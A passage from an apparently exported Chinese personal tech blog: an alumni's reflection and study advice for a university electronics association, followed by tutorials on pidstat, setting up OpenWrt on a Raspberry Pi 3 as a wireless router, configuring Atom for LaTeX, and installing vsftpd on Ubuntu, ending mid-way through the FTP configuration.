<h4 id="忆往昔峥嵘岁月"><a href="#忆往昔峥嵘岁月" class="headerlink" title="忆往昔峥嵘岁月"></a>忆往昔峥嵘岁月</h4><p>　　电协三周年，很多的感慨。三年一晃而过，还记得第一届成立大会的情景，当初稚嫩的我们如今都已经毕业。从跟着12级的学长学姐学习，到我们第二届接手电子协会与实验室，再到把接力棒交给第三届，看着现在第四届朝气蓬勃的样子，我是由衷地为协会和实验室的发展感到高兴。</p>
<p>　　一年又一年，一届带一届，最重要的是精神的传承。可能每个人对这种精神的定义会不一样，但是这几年，我看到的电协人的精神是团结、互助、拼搏与创新。这是一个有活力的团队，在这里，几位优秀的指导老师带领一届届电协人一起学技术、做项目、搞创新，取得了优异的成绩。</p>
<p>　　这也是一个友爱的团队，在这里，收获的不仅仅是技术的进步与自身素质的提升，更重要的是结识了一群志同道合的朋友。虽然一起奋斗的那些日子已经一去不复返，但是我们依然铭记。当国庆期间，受邀到到深圳广州游玩，实验室几位老铁毕业以后的第一次相约。再次相聚，我们还是老样子，有说有笑，一起聊技术聊生活，一起开黑，这样真的很棒。</p>
<h4 id="看今朝共铸辉煌"><a href="#看今朝共铸辉煌" class="headerlink" title="看今朝共铸辉煌"></a>看今朝共铸辉煌</h4><p> 　　很荣幸这次能够和学弟一起策划这么一个系列专访，目的也是让小伙伴们对协会和实验室有更深入的了解，也希望学长学姐的一些分享能给大家带来帮助。前面的推送中，学长学姐已经给大家分享了很多使用的经验，不管是刚刚加入协会和实验室的学弟学妹，还是已经在准备找工作、考研的同学，我觉得都应该好好看看他们的经验分享，可以让你少走一些弯路。既然是系列专访，作为协会和实验室的老腊肉，那我也来分享一点自己的经验吧。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/10/29-1.jpg" alt="29-1"></p>
<h5 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h5><p> 　　大学，最怕没有目标。可以看到大学很多人都很迷茫，不知道前进的方向。如果你迷茫，可以与往届的学长学姐多聊聊，他们或许能够给你一些建议。当然，最关键的还是自己要去寻找目标，多去尝试，多去了解，只有这样你才知道自己以后想要做什么。当然，相信能够选择加入协会和实验室的人至少应该是有目标或者正在寻找目标的人。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/10/29-2.jpg" alt="29-2"></p>
<p>　　学什么？协会和实验室已经有比较完善的学习体系，比如51单片机学习、PCB绘制等，这些都是必要的基础知识。除此之外，就我目前学习的经验以及我所了解的实验室的情况来看，建议大家可以学习一下嵌入式操作系统，比如嵌入式Linux、Contiki、RIOT或者华为的Lite-OS等。当然，还有著名的Linux，这是你们以后很有可能会接触到的。然后可以了解一下通信协议，比如6LoWPAN、ZigBee、NB-IoT等，这些也是做物联网相关项目的基础。另外，上次欧超学长回来提到的，大家不要总是拿着单片机闹钟、学生管理系统等这样的老掉牙的项目在做，我觉得也是很有道理的，大家在学完基础部分以后应该多了解一点新的技术，练习一些具有创新性、挑战性的项目。</p>
<h5 id="学习方法"><a href="#学习方法" class="headerlink" title="学习方法"></a>学习方法</h5><p>　　怎么学？好的学习方法往往能够使得你事半功倍。我们可以看到身边有少数同学，每天早出晚归，看似非常努力，但是效果却并不好。那如何取得更好的学习效果呢？谈一谈我认为比较重要的几点吧：</p>
<p>　　1. 广泛涉猎，善用工具。不要局限于某个很小的技术领域，而应该广泛涉猎相关的技术，其实，很多技术的都是相通的，很多思想可以互相借鉴。我在本科期间对嵌入式软件开发、安卓开发、Python编程、以及Web开发都有一定的了解，这些对我现在的研究都是很有帮助的。互联网时代，网上的工具和资源真是相当丰富了，多去CSDN、51CTO、华为等技术论坛，github等开源社区寻找你需要的工具。不要重复造轮子，多学习别人优秀的开源项目，从别人的项目中学习好的代码习惯，清晰的逻辑，高效的算法。开源在很大程度上推动着技术的进步，我们一方面可以充分利用开源项目进行学习与再创新，另一方面，也要学会分享，懂得分享，可以适当把自己的项目开源出去，让别人一起来改进。</p>
<p>　　2. 学会总结，善做笔记。做笔记其实是一个知识整理与总结的过程，当然，我说的做笔记不是一味地copy，最好的方式是用自己的话来表达。从我个人的习惯来说，我不仅使用像有道云笔记、evernote这样的工具做笔记，也时常把笔记整理后通过博客分享出去。个人认为，写博客就是一种很好的方式，不仅可以总结知识，分享知识，还可以广泛结交这个圈子里的人。技术博客不一定都是深奥的原理和技术分享，你自己学习中的一些知识点和问题的解决方法都可以记录成文章发表成博客。我是大二的时候开始写博客的，坚持了好几年，从CSDN到Wordpress再到现在的github pages，总计浏览量已达到十几万，这期间也通过博客结交了一群爱好技术的朋友，其中不乏名校的学生，也有出国留学的人。</p>
<p>　　3. 学会合作，注重交流。不要总是沉浸在自己的技术世界里面，多与别人合作，特别要注重交流，避免不必要的错误。一方面，一定要有自己的技术小团队，找几个志同道合，能够共同讨论交流，共同进步的人，平时遇到问题可以一起交流讨论，提升解决问题的效率。另一方面，尝试着通过留言、邮件等方式去与活跃于技术论坛的人交流，寻找学习与合作的机会。</p>
<h5 id="行动力"><a href="#行动力" class="headerlink" title="行动力"></a>行动力</h5><p>　　最后就是靠个人的行动了，努力、坚持不懈这些词不是我应该对你们说的，而应该是你们自己去做的，如何去做到，相信你会有自己的方法。好了，巴拉巴拉说了很多了，目前只想到这些，如果有什么问题可以联系我。</p>
<figure class="half"><br>    <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/10/29-5.jpg" width="200"><br>    <img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/10/29-4.jpg" width="200"><br></figure>


<p>　　另外，一个团结友爱的集体，不应该只有学习，还应该有酒有肉有故事。千万不要大学四年读完了都不知道长沙有哪些好玩的地方，有机会一起去市里浪一浪，别整天死宅死宅的，有机会也可以一起喝酒撸串，一起搞事情，一起谈人生谈理想。</p>
<h4 id="望未来任重而道远"><a href="#望未来任重而道远" class="headerlink" title="望未来任重而道远"></a>望未来任重而道远</h4><p>　　看到这几年协会与实验室的发展，每年都有很多优秀的人才，每年都能拿很多的奖励，估计所有的获奖证书连起来应该都可以绕实验室几圈了吧，哈哈哈~但是，我们应该始终保持危机感。从我了解的情况来看，学院其他协会和实验室都发展得很好，如何让电子协会和实验室取得更大的进步，面对技术的日新月异，如何抓住新机遇将实验室技术能力再提升一个档次等问题是我们都应该思考。</p>
<p>　　记得当初我做项目时使用的树莓派以及物联网云平台现在已经逐渐得到大家的认可，但是我觉得这个得到认可的周期太长了，大家应该更快的接受新的东西。就像我现在读研究生，导师都是要求我们通过一些顶级学术会议和期刊的论文来追踪学术热点，同样，大家所参加的一些开放式的竞赛也是这样，多看看别人在做什么项目，不要局限在自己的思维里，可能你觉得很好的一个想法，别人早就已经实现得很好了，所以你就不能单纯的实现别人已经实践过的项目，而应该在它的基础上思考还有什么可以改进的地方，实现再创新。总之，开阔眼界，广泛交流，这是我认为协会和实验室小伙伴可以努力的方向。</p>
<p>　　另外，有机会也可以邀请毕业的学长学姐回去分享经验，特别是在企业做嵌入式软件开发或者硬件开发的学长学姐，因为他们所做的东西更系统，更接近实际，也与大家以后的工作息息相关。希望协会和实验室能够让不同届的同学有更多沟通交流的机会，否则也就只有相近的两三届有联系了。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 进程实时监控：pidstat</title>
    <url>/2017/10/26/Linux%20%E8%BF%9B%E7%A8%8B%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%EF%BC%9Apidstat/</url>
    <content><![CDATA[<p>　　pidstat 主要用于监控全部或指定进程占用系统资源的情况，如 CPU，内存、设备 IO、任务切换、线程等。</p>
<a id="more"></a>
<h4 id="pidstat安装"><a href="#pidstat安装" class="headerlink" title="pidstat安装"></a>pidstat安装</h4><p>　　要使用 pidstat 需要安装 Sysstat，它是一个工具集，包括 sar、pidstat、iostat、mpstat、sadf、sadc。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> sudo apt-get install sysstat</div></pre></td></tr></table></figure>
<p>　　pidstat 首次运行时显示自系统启动开始的各项统计信息，之后运行 pidstat 将显示自上次运行该命令以后的统计信息。用户可以通过指定统计的次数和时间来获得所需的统计信息。</p>
<h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><p>　　用户手册：<a href="http://sebastien.godard.pagesperso-orange.fr/man_pidstat.html" target="_blank" rel="external">http://sebastien.godard.pagesperso-orange.fr/man_pidstat.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Usage: pidstat [ options ] [ &lt;interval&gt; [ &lt;count&gt; ] ]</div><div class="line">Options are:</div><div class="line">[ -d ] [ -h ] [ -I ] [ -l ] [ -R ] [ -r ] [ -s ] [ -t ] [ -U [ &lt;username&gt; ] ]</div><div class="line">[ -u ] [ -V ] [ -v ] [ -w ] [ -C &lt;command&gt; ] [ -G &lt;process_name&gt; ]</div><div class="line">[ -p &#123; &lt;pid&gt; [,...] | SELF | ALL &#125; ] [ -T &#123; TASK | CHILD | ALL &#125; ]</div></pre></td></tr></table></figure>
<h5 id="指定采样周期和采样次数"><a href="#指定采样周期和采样次数" class="headerlink" title="指定采样周期和采样次数"></a>指定采样周期和采样次数</h5><p>　　pidstat 命令指定采样周期和采样次数，例如以 2 秒为采样周期，输出 10 次 CPU 使用统计信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat 2 10</div></pre></td></tr></table></figure>
<h5 id="p-参数"><a href="#p-参数" class="headerlink" title="-p 参数"></a>-p 参数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">-p &#123; pid [,...] | SELF | ALL &#125; #指定进程显示其报告</div></pre></td></tr></table></figure>
<p>　　选择要报告统计信息的任务（进程）。pid 是进程标识号。 SELF 关键字表示要为 pidstat 进程本身报告统计信息，而 ALL 关键字表示要为系统管理的所有任务报告统计信息。SELF 和 ALL 可不指定，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat -p 进程号</div></pre></td></tr></table></figure>
<p>　　可使用以下命令获得进程号，以下命令会列出所有进程的进程号：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> ps -e</div></pre></td></tr></table></figure>
<p>　　也可以通过 top 命令或者直接查看某个服务的状态得到该服务涉及的进程。</p>
<h5 id="u参数"><a href="#u参数" class="headerlink" title="-u参数"></a>-u参数</h5><p>　　使用 -u 选项，pidstat 将显示各活动进程的 CPU 使用统计，执行 ”pidstat -u” 与单独执行 ”pidstat” 的效果一样。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat</div><div class="line">or</div><div class="line"><span class="meta">$</span> pidstat -u</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/10/26-1.png" alt="26-1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">- UID   # 正在监视的任务的真实用户识别号</div><div class="line">- USER  # 正在监视的任务的真实用户名</div><div class="line">- PID   # 被监视任务的识别号</div><div class="line">- %usr  # 在用户级（应用程序）执行任务时使用的CPU的百分比，有或没有优先级。请注意，此字段不包括运行虚拟处理器的时间</div><div class="line">- %system   # 在系统级别（内核）执行任务时CPU占用的百分比</div><div class="line">- %guest    # 虚拟机中任务占用的CPU的百分比（运行虚拟处理器）</div><div class="line">- %CPU  # 该任务使用的CPU时间的总百分比</div><div class="line">- CPU   # 处理器号，任务被哪个处理器处理</div><div class="line">- Command   # 任务的命令名</div></pre></td></tr></table></figure>
<h5 id="r参数"><a href="#r参数" class="headerlink" title="-r参数"></a>-r参数</h5><p>　　使用 -u 选项，pidstat 将显示各活动进程的页面故障和内存利用率。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat -r</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/10/26-2.png" alt="26-2"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">- UID   # 正在监视的任务的真实用户识别号</div><div class="line">- USER  # 正在监视的任务的真实用户名</div><div class="line">- PID   # 被监视任务的识别号</div><div class="line">- minflt/s  # 每秒次缺页错误次数(minor page faults)，次缺页错误次数意即虚拟内存地址映射成物理内存地址产生的page fault次数</div><div class="line">- majflt/s  # 每秒主缺页错误次数(major page faults)，当虚拟内存地址映射成物理内存地址时，相应的page在swap中，这样的page fault为major page fault，一般在内存使用紧张时产生</div><div class="line">- VSZ   # 该进程使用的虚拟内存(以kB为单位)</div><div class="line">- RSS   # 该进程使用的物理内存(以kB为单位)</div><div class="line">- %MEM  # 当前任务使用的有效内存的百分比</div><div class="line">- Command   # 任务的命令名</div></pre></td></tr></table></figure>
<h5 id="d参数"><a href="#d参数" class="headerlink" title="-d参数"></a>-d参数</h5><p>　　使用 -d 选项，pidstat 将将显示各活动进程的 I/O 统计信息（内核 2.6.20 及更高版本）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat -d</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/10/26-3.png" alt="26-3"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">- UID   # 正在监视的任务的真实用户识别号</div><div class="line">- USER  # 正在监视的任务的真实用户名</div><div class="line">- PID   # 被监视任务的识别号</div><div class="line">- kB_rd/s   # 每秒此进程从磁盘读取的千字节数</div><div class="line">- kB_wr/s   # 此进程已经或者将要写入磁盘的每秒千字节数</div><div class="line">- kB_ccwr/s # 由任务取消的写入磁盘的千字节数</div><div class="line">- iodelay   # 阻止正在监视的任务的I/O延迟，以时钟滴答测量</div><div class="line">- Command   # 命令的名字</div></pre></td></tr></table></figure>
<h5 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">-h  # 显示所有的活动的任务</div><div class="line">-I  # 在SMP环境，指出任务的CPU使用（等同于选项-u）应该被除于cpu的总数</div><div class="line">-l  # 显示进程的命令名和它的参数</div><div class="line">-T &#123; TASK | CHILD | ALL &#125;   # 指定必须监测的内容：TASK是默认的，单个任务的报告；CHILD：指定的进程和他们的子进程的全局报告，ALL：相当于TASK和CHILD</div><div class="line">-s  # 堆栈的使用</div><div class="line">-t  # 显示与所选任务相关的线程的统计数据</div><div class="line">-w  # 报告任务切换情况</div></pre></td></tr></table></figure>
<h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><p>　　以 2 秒为采样周期，输出 5 次进程号为 1643 的页面故障和内存使用统计信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat -r -p 1643 2 5</div></pre></td></tr></table></figure>
<p>　　以 2 秒为采样周期，输出 5 次进程号为 1643 的页面故障和内存使用统计信息以及 CPU 使用率。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat -u -r -p 1643 2 10</div></pre></td></tr></table></figure>
<p>　　以 2 秒为采样周期，输出 10 次系统中所有任务的子进程的页面错误统计信息。只显示具有非零统计值的子进程。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat -T CHILD -r 2 10</div></pre></td></tr></table></figure>
<h4 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h4><p>　　重定向输出即可，例如，每隔两秒记录 1 次，一共 10 次，并输出到 data.txt 文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> pidstat 2 10 &gt; data.txt</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>pidstat</tag>
      </tags>
  </entry>
  <entry>
    <title>Raspberry pi 3 + OpenWrt 打造无线路由器</title>
    <url>/2017/10/18/Raspberry%20Pi%203%20+%20OpenWrt%20%E6%89%93%E9%80%A0%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8/</url>
    <content><![CDATA[<p>　　OpenWrt 在 Raspberry pi 3 上的安装与初步配置记录。</p>
<a id="more"></a>
<h4 id="烧写-Openwrt-系统"><a href="#烧写-Openwrt-系统" class="headerlink" title="烧写 Openwrt 系统"></a>烧写 Openwrt 系统</h4><p>　　下载支持 Raspberry Pi 3 代的 LEDE（Openwrt的一个分支）镜像。</p>
<p>　　LEDE官方网站：<a href="https://lede-project.org/" target="_blank" rel="external">https://lede-project.org/</a></p>
<p>　　Raspbery Pi 3 LEDE镜像下载地址：<a href="http://downloads.lede-project.org/snapshots/targets/brcm2708/bcm2710/lede-brcm2708-bcm2710-rpi-3-ext4-sdcard.img.gz" target="_blank" rel="external">http://downloads.lede-project.org/snapshots/targets/brcm2708/bcm2710/lede-brcm2708-bcm2710-rpi-3-ext4-sdcard.img.gz</a></p>
<p>　　使用 Win32DiskImager 工具将下载的镜像文件写入到 SD 卡中，然后连接显示器键盘即可进入系统进行相关操作。</p>
<p>　　<strong>Raspbery Pi 3 连接显示器后无显示的问题：</strong></p>
<p>　　修改系统 /boot/comfig.txt 文件，默认的 HDMI 输出都配置为不开启，所以需要配置 HDMI 输出为如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">hdmi_safe=1</div><div class="line">overscan_left=-30</div><div class="line">overscan_right=-30</div><div class="line">overscan_top=-30</div><div class="line">overscan_bottom=-30</div><div class="line">hdmi_group=2</div><div class="line">hdmi_mode=4</div><div class="line">hdmi_drive=2</div><div class="line">config_hdmi_boost=4</div></pre></td></tr></table></figure>
<h4 id="配置-Openwrt"><a href="#配置-Openwrt" class="headerlink" title="配置 Openwrt"></a>配置 Openwrt</h4><p>　　配置 Openwrt 有线网络，修改 /etc/config/network 文件，配置 wan 口和 lan 口如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">config interface &apos;lan&apos;</div><div class="line">    option type &apos;bridge&apos;</div><div class="line">    option proto &apos;static&apos;</div><div class="line">    option ipaddr &apos;192.168.3.1&apos;</div><div class="line">    option netmask &apos;255.255.255.0&apos;</div><div class="line">    option ip6assign &apos;60&apos;</div><div class="line">    option gateway &apos;192.168.3.1&apos;</div><div class="line"></div><div class="line">config interface &apos;wan&apos;</div><div class="line">        option proto &apos;dhcp&apos;</div><div class="line">        option ifname &apos;eth0&apos;</div></pre></td></tr></table></figure>
<p>　　配置 Openwrt 无线网络，修改 /etc/config/wireless 文件，配置 wlan0 的模式、ssid、key 等信息，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">config wifi-iface</div><div class="line">    option device &apos;radio0&apos;</div><div class="line">    option network &apos;lan&apos;</div><div class="line">    option mode &apos;ap&apos;</div><div class="line">    option ssid &apos;openwrt-fzy&apos;</div><div class="line">    option encryption &apos;psk2&apos;</div><div class="line">    option key &apos;12345678&apos;</div></pre></td></tr></table></figure>
<p>　　配置允许通过 wan 连接 ssh，修改 /etc/config/firewall 文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">#open ssh on wan interface</div><div class="line">config rule                </div><div class="line">        option src              wan</div><div class="line">        option dest_port        22</div><div class="line">        option target           ACCEPT     </div><div class="line">        option proto</div></pre></td></tr></table></figure>
<p>　　重启 Raspberry Pi，网线连接路由器 dhcp 获取 ip，笔记本用 wifi 连接 Raspberry Pi。</p>
<p>　　安装 luci 界面，可以通过浏览器访问路由。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">opkg update</div><div class="line">opkg install luci</div><div class="line">/etc/init.d/uhttpd start</div><div class="line">/etc/init.d/uhttpd enable</div></pre></td></tr></table></figure>
<p>　　配置完成后可通过连接到该无线网络的设备访问 192.168.3.1 进入到路由器的 Web 配置界面。</p>
<p>　　至此，Raspberry Pi 作为路由器部分已经完成，后续还可以将其配置成 Wi-Fi 抓包器。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>Raspberry Pi</tag>
        <tag>OpenWrt</tag>
      </tags>
  </entry>
  <entry>
    <title>Atom Latex 编辑器配置</title>
    <url>/2017/09/16/Atom%20Latex%20%E7%BC%96%E8%BE%91%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>　　将 Atom 配置成为强大的 Latex 编辑器。</p>
<a id="more"></a>
<h4 id="安装-Atom"><a href="#安装-Atom" class="headerlink" title="安装 Atom"></a>安装 Atom</h4><p>　　Atom 是由 GitHub 打造更为先进的编辑器，支持 Windows、Mac、Linux 三大桌面平台，完全免费，并且已经在 GitHub 上开放了全部的源代码。</p>
<p>　　Atom 高度的可定制性，让用户可以自行添加所需要的功能，打造自己最易用的代码编辑器。与其它主流代码编辑器相比，显得轻巧了许多。</p>
<p>　　官网下载地址：<a href="https://atom.io/" target="_blank" rel="external">https://atom.io/</a></p>
<p>　　Atom Github 地址：<a href="https://github.com/atom/atom" target="_blank" rel="external">https://github.com/atom/atom</a></p>
<p>　　如果使用官网的 Installer 安装失败，可直接到 Github 下载压缩包，直接解压使用，无需安装。</p>
<p>　　下载地址：<a href="https://github.com/atom/atom/releases/tag/v1.20.0" target="_blank" rel="external">https://github.com/atom/atom/releases/tag/v1.20.0</a></p>
<h4 id="安装-Texlive"><a href="#安装-Texlive" class="headerlink" title="安装 Texlive"></a>安装 Texlive</h4><p>　　TeX Live 是一个 TeX 发行版，它是一组程序的集合，主要作用就是将你写的 TeX 代码进行解析排版输出成 PS 或者 pdf。“TeX 发行版相对于 TeX 语言”大致可以理解为“ C 语言编译器（如GCC或Clang）相对于 C 语言”的关系；</p>
<p>　　下载地址：<a href="http://tug.org/texlive/acquire-netinstall.html" target="_blank" rel="external">http://tug.org/texlive/acquire-netinstall.html</a></p>
<p>　　<strong>记住安装地址，后续需要用到！</strong></p>
<h4 id="安装-Latex-编译插件"><a href="#安装-Latex-编译插件" class="headerlink" title="安装 Latex 编译插件"></a>安装 Latex 编译插件</h4><p>　　打开 Atom，File -&gt; Settings -&gt; Install，搜索并安装 Latex 插件，然后配置插件。</p>
<p>　　配置 Tex Path 为 texlive 的安装路径，Engine 为 pdflatex，其他的默认即可，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/16-1.png" alt="16-1"></p>
<p>　　<strong>注意：</strong></p>
<p>　　我们可能会遇到与 Atom 官网连接故障的问题导致 Atom 插件安装失败，可采用手动安装的方式，在 Atom 中搜索到相关 package，点击插件名到 Atom Packages 页面。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/16-2.png" alt="16-2"></p>
<p>　　然后到该插件的 Github 仓库，使用 git 将其克隆到 Atom 的 packages 文件夹，或者使用下载 zip 文件并解压的方式，最后用 npm 命令安装。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/16-3.png" alt="16-3"></p>
<p>　　Windows 下 .atom 文件夹在 C 盘 Users 对应的你的用户名的目录下。</p>
<p>　　注：需提前安装 nodejs，安装 node 以后自动会安装 npm，使用 Git 命令行工具进行下载，然后使用 npm 进行安装。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> cd ~/.atom/packages</div><div class="line"><span class="meta">$</span> git clone https://github.com/thomasjo/atom-latex.git</div><div class="line"><span class="meta">$</span> cd latex</div><div class="line"><span class="meta">$</span> npm install</div></pre></td></tr></table></figure>
<p>　　然后重启 Atom 即可看到该插件已经成功安装。</p>
<h4 id="安装语言高亮插件"><a href="#安装语言高亮插件" class="headerlink" title="安装语言高亮插件"></a>安装语言高亮插件</h4><p>　　搜索并安装 language-latex 插件，该插件还可以实现 LaTeX 命令的自动补全功能，具体使用方案请自行搜索。</p>
<h4 id="安装-PDF-预览插件"><a href="#安装-PDF-预览插件" class="headerlink" title="安装 PDF 预览插件"></a>安装 PDF 预览插件</h4><p>　　搜索并安装 pdf-view 插件，安装以后，Latex 编译后会调用此插件进行 pdf 预览。</p>
<h4 id="编译预览"><a href="#编译预览" class="headerlink" title="编译预览"></a>编译预览</h4><p>　　新建 Latex 文件，后缀为 tex，然后填写如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">\documentclass[UTF8]&#123;article&#125;</div><div class="line">\author &#123;Zhenyu Fan&#125;</div><div class="line">\title &#123;My First Latex document&#125;</div><div class="line"></div><div class="line">\usepackage&#123;ctex&#125;</div><div class="line">\usepackage&#123;amsmath&#125;</div><div class="line">\usepackage&#123;amssymb&#125;</div><div class="line">\begin&#123;document&#125;</div><div class="line">\maketitle</div><div class="line">\section&#123;First section&#125;</div><div class="line">    \subsection&#123;First subsection&#125;</div><div class="line">        \subsubsection&#123;First double subsection&#125;</div><div class="line">            \paragraph&#123;Fist paragraph&#125;</div><div class="line">    \subsection&#123;Second subsection&#125;</div><div class="line"></div><div class="line">心之所向，素履以往。</div><div class="line"></div><div class="line">\end&#123;document&#125;</div></pre></td></tr></table></figure>
<p>　　点击 Atom 菜单栏 Packages -&gt; Latex -&gt; Builde（快捷键 Ctrl+Alt+B）进行编译，然后就可以看到右侧生成的pdf 文件，修改之后只要再次编译就可以查看到修改之后的预览效果。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/9/16-4.png" alt="16-4"></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Latex</tag>
        <tag>Atom</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 中 FTP 服务器安装与配置</title>
    <url>/2017/09/14/Ubuntu%20%E4%B8%AD%20FTP%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>　　最近需要用到 FTP，所以在腾讯云服务器上搭建了一个ftp服务器，简单记录一下 Ubuntu Server 中 FTP 服务器的初步配置。</p>
<a id="more"></a>
<h4 id="FTP-服务器安装"><a href="#FTP-服务器安装" class="headerlink" title="FTP 服务器安装"></a>FTP 服务器安装</h4><h5 id="安装vsftpd"><a href="#安装vsftpd" class="headerlink" title="安装vsftpd"></a>安装vsftpd</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install vsftpd</span></div></pre></td></tr></table></figure>
<h5 id="检查FTP端口是否已经打开"><a href="#检查FTP端口是否已经打开" class="headerlink" title="检查FTP端口是否已经打开"></a>检查FTP端口是否已经打开</h5><p>FTP默认情况下，命令端口是21，数据端口就是20</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> netstat -tnl</span></div></pre></td></tr></table></figure>
<p>或者直接在浏览器里输入“ftp://服务器IP”</p>
<h5 id="启动-vsftpd-服务"><a href="#启动-vsftpd-服务" class="headerlink" title="启动 vsftpd 服务"></a>启动 vsftpd 服务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> service vsftpd start</span></div><div class="line">或</div><div class="line"><span class="meta">$</span><span class="bash"> /etc/init.d/vsftpd start</span></div></pre></td></tr></table></figure>
<h5 id="停止-vsftpd-服务"><a href="#停止-vsftpd-服务" class="headerlink" title="停止 vsftpd 服务"></a>停止 vsftpd 服务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> service vsftpd stop</span></div><div class="line">或</div><div class="line"><span class="meta">$</span><span class="bash"> /etc/init.d/vsftpd stop</span></div></pre></td></tr></table></figure>
<h5 id="重启-vsftpd-服务"><a href="#重启-vsftpd-服务" class="headerlink" title="重启 vsftpd 服务"></a>重启 vsftpd 服务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> service vsftpd restart</span></div><div class="line">或</div><div class="line"><span class="meta">$</span><span class="bash"> /etc/init.d/vsftpd restart</span></div></pre></td></tr></table></figure>
<h5 id="查看服务状态"><a href="#查看服务状态" class="headerlink" title="查看服务状态"></a>查看服务状态</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo service vsftpd status</span></div></pre></td></tr></table></figure>
<h4 id="FTP-服务器配置"><a href="#FTP-服务器配置" class="headerlink" title="FTP 服务器配置"></a>FTP 服务器配置</h4><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><ul>
<li>主配置文件：/etc/vsftp.conf</li>
<li>权限限制用户列表文件：/etc/vsftp.chroot_list</li>
<li>认证配置文件：/etc/pam.d/vsftpd</li>
</ul>
<h5 id="主配置文件"><a href="#主配置文件" class="headerlink" title="主配置文件"></a>主配置文件</h5><p>　　修改主配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo nano /etc/vsftpd.conf</span></div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">anonymous_enable=NO（是否允许匿名登陆）</div><div class="line">local_enable=YES（是否允许本地登陆）</div><div class="line">write_enable=YES（设置FTP可写）</div></pre></td></tr></table></figure>
<p>　　<strong>chroot：change root directory</strong></p>
<p>　　<strong>chroot_local_user：</strong> 是否将所有用户限制在主目录，YES 为启用 NO 禁用。(该项默认值是 NO，即在安装 vsftpd 后不做配置的话，FTP 用户是可以向上切换到要目录之外的)</p>
